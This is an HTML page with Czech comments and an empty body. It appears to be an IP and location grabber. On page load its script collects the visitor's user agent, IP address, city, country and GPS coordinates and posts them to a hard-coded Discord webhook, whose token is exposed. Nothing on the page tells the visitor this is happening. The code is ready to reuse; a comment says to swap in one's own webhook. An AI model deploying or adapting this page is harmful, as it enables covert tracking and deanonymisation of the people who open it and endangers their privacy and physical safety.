<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolokace</title>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Nahraď svým webhookem

        // Funkce pro získání informací o zařízení a IP
        function getDeviceAndIP() {
            let device = navigator.userAgent; // Detekce zařízení

            fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                const message = `📱 Zařízení: ${device}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})`;

                // Pokud je dostupná GPS, přidáme ji do zprávy
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        const lat = position.coords.latitude.toFixed(6);
                        const lon = position.coords.longitude.toFixed(6);
                        sendToDiscord(`${message}\n📍 GPS: ${lat}, ${lon}`);
                    }, () => {
                        // Pokud není možné získat GPS, odešleme pouze zařízení a IP
                        sendToDiscord(message);
                    });
                } else {
                    // Pokud geolokace není podporována, pošleme jen zařízení a IP
                    sendToDiscord(message);
                }
            })
            .catch(error => console.error("Chyba získání IP:", error));
        }

        // Funkce pro odeslání zprávy na Discord
        function sendToDiscord(message) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            }).catch(error => console.error("Chyba odesílání:", error));
        }

        // Načtení stránky
        window.onload = getDeviceAndIP;
    </script>
</head>
<body>
</body>
</html>
